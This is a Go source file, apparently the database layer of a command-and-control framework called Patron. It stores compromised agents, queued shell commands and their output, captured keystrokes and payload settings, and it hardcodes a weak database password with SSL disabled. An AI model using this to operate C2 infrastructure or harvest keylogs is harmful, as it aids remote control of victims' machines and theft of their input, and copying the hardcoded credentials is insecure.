package data

import (
	"database/sql"
	"fmt"
	"log"

	"github.com/PatronC2/Patron/helper"
	"github.com/PatronC2/Patron/types"
	_ "github.com/mattn/go-sqlite3"
	_ "github.com/lib/pq"
	"github.com/s-christian/gollehs/lib/logger"
)

// var db *sql.DB 

const (
	host     = "172.18.0.9" // add to env setup
	port     = 5432
	user     = "patron"
	password = "qwerty"
	dbname   = "patron"
  )


func OpenDatabase() *sql.DB { 
	psqlInfo := fmt.Sprintf("host=%s port=%d user=%s "+
    "password=%s dbname=%s sslmode=disable",
    host, port, user, password, dbname)
	var err error
	db, err := sql.Open("postgres", psqlInfo)
	if err != nil {
		log.Fatal(err)
	}
	err = db.Ping()
	if err != nil {
		log.Fatal(err)
	}
	logger.Logf(logger.Info, "Postgres DB connected\n")
	return db
}

func InitDatabase(db *sql.DB) {
	AgentSQL := `
	CREATE TABLE IF NOT EXISTS "Agents" (
		"AgentID" SERIAL PRIMARY KEY,
		"UUID" TEXT NOT NULL UNIQUE,
		"Status" TEXT NOT NULL DEFAULT 'Online',
		"CallBackToIP" TEXT NOT NULL DEFAULT 'Unknown',
		"CallBackFeq" TEXT NOT NULL DEFAULT 'Unknown',
		"CallBackJitter" TEXT NOT NULL DEFAULT 'Unknown',
		"Ip" TEXT NOT NULL DEFAULT 'Unknown',
		"User" TEXT NOT NULL DEFAULT 'Unknown',
		"Hostname" TEXT NOT NULL DEFAULT 'Unknown',
		"isDeleted" INTEGER NOT NULL DEFAULT 0,
		"LastCallBack" INTEGER NOT NULL DEFAULT 0
	);
	`
	_, err := db.Exec(AgentSQL)
	if err != nil {
		log.Fatal(err.Error())
	}
	logger.Logf(logger.Info, "Agents table initialized\n")

	CommandSQL := `
	CREATE TABLE IF NOT EXISTS "Commands" (
		"CommandID" SERIAL PRIMARY KEY,
		"UUID" TEXT,
		"Result" TEXT,
		"CommandType" TEXT,
		"Command" TEXT,
		"CommandUUID" TEXT,
		"Output" TEXT DEFAULT 'Unknown',
		FOREIGN KEY ("UUID") REFERENCES "Agents" ("UUID")
	);
	`
	_, err = db.Exec(CommandSQL)
	if err != nil {
		log.Fatal(err.Error())
	}
	logger.Logf(logger.Info, "Commands table initialized\n")

	KeylogSQL := `
	CREATE TABLE IF NOT EXISTS "Keylog" (
		"KeylogID" SERIAL PRIMARY KEY,
		"UUID" TEXT,
		"Keys" TEXT,
		FOREIGN KEY ("UUID") REFERENCES "Agents" ("UUID")
	);
	`
	_, err = db.Exec(KeylogSQL)
	if err != nil {
		log.Fatal(err.Error())
	}
	logger.Logf(logger.Info, "Keylog table initialized\n")

	PayloadSQL := `
	CREATE TABLE IF NOT EXISTS "Payloads" (
		"PayloadID" SERIAL PRIMARY KEY,
		"UUID" TEXT,
		"Name" TEXT,
		"Description" TEXT,
		"ServerIP" TEXT,
		"ServerPort" TEXT,
		"CallbackFrequency" TEXT,
		"CallbackJitter" TEXT,
		"Concat" TEXT,
		"isDeleted" INTEGER NOT NULL DEFAULT 0
	);
	`
	_, err = db.Exec(PayloadSQL)
	if err != nil {
		log.Fatal(err.Error())
	}
	logger.Logf(logger.Info, "Payloads table initialized\n")
}

func CreateAgent(db *sql.DB, uuid string, CallBackToIP string, CallBackFeq string, CallBackJitter string, Ip string, User string, Hostname string) {
	CreateAgentSQL := `INSERT INTO "Agents" ("UUID", "CallBackToIP", "CallBackFeq", "CallBackJitter", "Ip", "User", "Hostname")
VALUES ($1, $2, $3, $4, $5, $6, $7)`

	statement, err := db.Prepare(CreateAgentSQL)
	if err != nil {

		log.Fatalln(err)
		logger.Logf(logger.Info, "Error in DB\n")
	}

	_, err = statement.Exec(uuid, CallBackToIP, CallBackFeq, CallBackJitter, Ip, User, Hostname)
	if err != nil {

		log.Fatalln(err)
	}
	logger.Logf(logger.Info, "New Agent created in DB\n")
}

func CreateKeys(db *sql.DB, uuid string) {
	CreateKeysSQL := `INSERT INTO "Keylog" ("UUID", "Keys")
	VALUES ($1, $2)`

	statement, err := db.Prepare(CreateKeysSQL)
	if err != nil {

		log.Fatalln(err)
		logger.Logf(logger.Info, "Error in DB\n")
	}

	_, err = statement.Exec(uuid, "")
	if err != nil {

		log.Fatalln(err)
	}
	logger.Logf(logger.Info, "New Keylog Agent created in DB\n")
}

func CreatePayload(db *sql.DB, uuid string, name string, description string, ServerIP string, ServerPort string, CallBackFeq string, CallBackJitter string, Concat string) {
	CreateAgentSQL := `INSERT INTO "Payloads" ("UUID", "Name", "Description", "ServerIP", "ServerPort", "CallbackFrequency", "CallbackJitter", "Concat")
	VALUES ($1, $2, $3, $4, $5, $6, $7, $8)`

	statement, err := db.Prepare(CreateAgentSQL)
	if err != nil {

		log.Fatalln(err)
		logger.Logf(logger.Info, "Error in DB\n")
	}

	_, err = statement.Exec(uuid, name, description, ServerIP, ServerPort, CallBackFeq, CallBackJitter, Concat)
	if err != nil {

		log.Fatalln(err)
	}
	logger.Logf(logger.Info, "New Payload created in DB\n")
}

func FetchOneAgent(db *sql.DB, uuid string) types.ConfigAgent {
	var info types.ConfigAgent
	FetchSQL := `
	SELECT 
		"UUID","CallBackToIP","CallBackFeq","CallBackJitter"
	FROM "Agents" WHERE "UUID"=$1
	`
	row, err := db.Query(FetchSQL, uuid)
	if err != nil {
		log.Fatal(err)
	}
	defer row.Close()
	for row.Next() {
		err := row.Scan(
			&info.Uuid,
			&info.CallbackTo,
			&info.CallbackFrequency,
			&info.CallbackJitter,
		)
		switch err {
		case sql.ErrNoRows:
			logger.Logf(logger.Info, "No rows were returned!! \n")
			return info
		case nil:
			fmt.Println(info)
		default:
			panic(err)
		}
	}

	logger.Logf(logger.Info, "Agent %s Fetched \n", info.Uuid)
	return info
}

func FetchNextCommand(db *sql.DB, uuid string) types.GiveAgentCommand {
	var info types.GiveAgentCommand
	FetchSQL := `
	SELECT 
		"Commands"."UUID", 
		"Agents"."CallBackToIP", 
		"Agents"."CallBackFeq", 
		"Agents"."CallBackJitter", 
		"Commands"."CommandType", 
		"Commands"."Command", 
		"Commands"."CommandUUID"
	FROM "Commands" INNER JOIN 
		"Agents" ON "Commands"."UUID" = "Agents"."UUID" 
	WHERE "Commands"."UUID"=$1 AND "Commands"."Result"='0' LIMIT 1
	`
	row, err := db.Query(FetchSQL, uuid)
	if err != nil {
		log.Fatal(err)
	}
	defer row.Close()
	for row.Next() {
		err := row.Scan(
			&info.UpdateAgentConfig.Uuid,
			&info.UpdateAgentConfig.CallbackTo,
			&info.UpdateAgentConfig.CallbackFrequency,
			&info.UpdateAgentConfig.CallbackJitter,
			&info.CommandType,
			&info.Command,
			&info.CommandUUID,
			// &info.Binary,
		)
		switch err {
		case sql.ErrNoRows:
			logger.Logf(logger.Info, "No rows were returned!! \n")
			return info
		case nil:
			fmt.Println(info)
		default:
			panic(err)
		}
	}

	logger.Logf(logger.Info, "Agent %s Fetched Next Command %s \n", info.UpdateAgentConfig.Uuid, info.Command)
	return info
}
func SendAgentCommand(db *sql.DB, uuid string, result string, CommandType string, Command string, CommandUUID string) {
	SendAgentCommandSQL := `INSERT INTO "Commands" ("UUID", "Result", "CommandType", "Command", "CommandUUID")
	VALUES ($1, $2, $3, $4, $5)`

	statement, err := db.Prepare(SendAgentCommandSQL)
	if err != nil {

		log.Fatalln(err)
		logger.Logf(logger.Info, "Error in DB\n")
	}

	_, err = statement.Exec(uuid, result, CommandType, Command, CommandUUID)
	if err != nil {

		log.Fatalln(err)
	}
	logger.Logf(logger.Info, "Agent %s Reveived New Command \n", uuid)
}

func UpdateAgentConfig(db *sql.DB, UUID string, CallbackServer string, CallbackFrequency string, CallbackJitter string) {
	updateAgentConfigSQL := `UPDATE "Agents" SET "CallBackToIP"= $1, "CallBackFeq"= $2, "CallBackJitter"= $3 WHERE "UUID"= $4`

	statement, err := db.Prepare(updateAgentConfigSQL)
	if err != nil {

		log.Fatalln(err)
		logger.Logf(logger.Info, "Error in DB\n")
	}

	_, err = statement.Exec(CallbackServer, CallbackFrequency, CallbackJitter, UUID)
	if err != nil {

		log.Fatalln(err)
	}
	logger.Logf(logger.Info, "Agent %s Reveived Config Update  \n", UUID)
}

func UpdateAgentCheckIn(db *sql.DB, UUID string, LastCallBack int64) {
	updateAgentCheckInSQL := `UPDATE "Agents" SET "LastCallBack"= $1 WHERE "UUID"= $2`

	statement, err := db.Prepare(updateAgentCheckInSQL)
	if err != nil {

		log.Fatalln(err)
		logger.Logf(logger.Info, "Error in DB\n")
	}

	_, err = statement.Exec(LastCallBack, UUID)
	if err != nil {

		log.Fatalln(err)
	}
	logger.Logf(logger.Done, "Agent %s Check in Update  \n", UUID)
}

func UpdateAgentStatus(db *sql.DB) {
	updateAgentStatusSQL := `UPDATE "Agents"
	SET "Status" = CASE WHEN (EXTRACT(EPOCH FROM CURRENT_TIMESTAMP)  - "LastCallBack" > (2 * ("CallBackFeq"::numeric)))
		THEN 'Offline' ELSE 'Online' END
	WHERE "AgentID" IN (SELECT "AgentID" FROM "Agents");`

	statement, err := db.Prepare(updateAgentStatusSQL)
	if err != nil {

		log.Fatalln(err)
		logger.Logf(logger.Info, "Error in DB\n")
	}

	_, err = statement.Exec()
	if err != nil {

		log.Fatalln(err)
	}
	logger.Logf(logger.Info, "Agent Status Updated\n")
}

func UpdateAgentCommand(db *sql.DB, CommandUUID string, Output string, uuid string) {
	updateAgentCommandSQL := `UPDATE "Commands" SET "Result"='1', "Output"= $1 WHERE "CommandUUID"= $2`

	statement, err := db.Prepare(updateAgentCommandSQL)
	if err != nil {

		log.Fatalln(err)
		logger.Logf(logger.Info, "Error in DB\n")
	}

	_, err = statement.Exec(Output, CommandUUID)
	if err != nil {

		log.Fatalln(err)
	}
	logger.Logf(logger.Info, "Agent %s Reveived Output with CommandID %s \n", uuid, CommandUUID)
}

func UpdateAgentKeys(db *sql.DB, UUID string, Keys string) {
	updateAgentKeylogSQL := `UPDATE "Keylog" SET "Keys"="Keys" || $1 WHERE "UUID"= $2`

	statement, err := db.Prepare(updateAgentKeylogSQL)
	if err != nil {

		log.Fatalln(err)
		logger.Logf(logger.Info, "Error in DB\n")
	}

	_, err = statement.Exec(Keys, UUID)
	if err != nil {

		log.Fatalln(err)
	}
}

func DeleteAgent(db *sql.DB, UUID string) {
	DeleteAgentSQL := `UPDATE "Agents" SET "isDeleted"=1 WHERE "UUID"= $1`

	statement, err := db.Prepare(DeleteAgentSQL)
	if err != nil {

		log.Fatalln(err)
		logger.Logf(logger.Info, "Error in DB\n")
	}

	_, err = statement.Exec(UUID)
	if err != nil {

		log.Fatalln(err)
	}
}

// WEB Functions

func Agents(db *sql.DB) []types.ConfigAgent {
	var agents types.ConfigAgent
	FetchSQL := `
	SELECT 
		"UUID", 
		"CallBackToIP", 
		"CallBackFeq", 
		"CallBackJitter", 
		"Ip", 
		"User", 
		"Hostname",
		"Status"
	FROM "Agents"
	WHERE "isDeleted"='0'
	`
	row, err := db.Query(FetchSQL)
	if err != nil {
		log.Fatal(err)
	}
	defer row.Close()
	var agentAppend []types.ConfigAgent
	for row.Next() {
		row.Scan(
			&agents.Uuid,
			&agents.CallbackTo,
			&agents.CallbackFrequency,
			&agents.CallbackJitter,
			&agents.AgentIP,
			&agents.Username,
			&agents.Hostname,
			&agents.Status,
		)
		agentAppend = append(agentAppend, agents)
	}
	return agentAppend
}

func Payloads(db *sql.DB) []types.Payload {
	var payloads types.Payload
	FetchSQL := `
	SELECT 
		"UUID", 
		"Name",
		"Description",
		"ServerIP", 
		"ServerPort", 
		"CallbackFrequency", 
		"CallbackJitter",
		"Concat" 
	FROM "Payloads"
	WHERE "isDeleted"='0'
	`
	row, err := db.Query(FetchSQL)
	if err != nil {
		log.Fatal(err)
	}
	defer row.Close()
	var payloadAppend []types.Payload
	for row.Next() {
		row.Scan(
			&payloads.Uuid,
			&payloads.Name,
			&payloads.Description,
			&payloads.ServerIP,
			&payloads.ServerPort,
			&payloads.CallbackFrequency,
			&payloads.CallbackJitter,
			&payloads.Concat,
		)
		payloadAppend = append(payloadAppend, payloads)
	}
	return payloadAppend
}

func Agent(db *sql.DB, uuid string) []types.Agent {
	var info types.Agent
	FetchSQL := `
	SELECT 
		"UUID", 
		"CommandType", 
		"Command", 
		"CommandUUID", 
		"Output"
	FROM "Commands"
	WHERE "UUID"= $1 AND "CommandType" = 'shell'
	`
	row, err := db.Query(FetchSQL, uuid)
	if err != nil {
		log.Fatal(err)
	}
	defer row.Close()
	var infoAppend []types.Agent
	for row.Next() {
		row.Scan(
			&info.Uuid,
			&info.CommandType,
			&info.Command,
			&info.CommandUUID,
			&info.Output,
		)
		infoAppend = append(infoAppend, info)
	}
	return infoAppend
}

func Keylog(db *sql.DB, uuid string) []types.KeyReceive {
	var info types.KeyReceive
	FetchSQL := `
	SELECT 
		"UUID", 
		"Keys"
	FROM "Keylog"
	WHERE "UUID"= $1
	`
	row, err := db.Query(FetchSQL, uuid)
	if err != nil {
		log.Fatal(err)
	}
	defer row.Close()
	var infoAppend []types.KeyReceive
	for row.Next() {
		row.Scan(
			&info.Uuid,
			&info.Keys,
		)
		info.Keys = helper.FormatKeyLogs(info.Keys)
		infoAppend = append(infoAppend, info)
	}
	return infoAppend
}

func FetchOne(db *sql.DB, uuid string) []types.ConfigAgent {
	var info types.ConfigAgent
	FetchSQL := `
	SELECT 
		"UUID","CallBackToIP","CallBackFeq","CallBackJitter"
	FROM "Agents" WHERE "UUID"=$1
	`
	row, err := db.Query(FetchSQL, uuid)
	if err != nil {
		log.Fatal(err)
	}
	defer row.Close()
	var infoAppend []types.ConfigAgent
	for row.Next() {
		row.Scan(
			&info.Uuid,
			&info.CallbackTo,
			&info.CallbackFrequency,
			&info.CallbackJitter,
		)
	}
	infoAppend = append(infoAppend, info)
	fmt.Println(info)
	return infoAppend
}
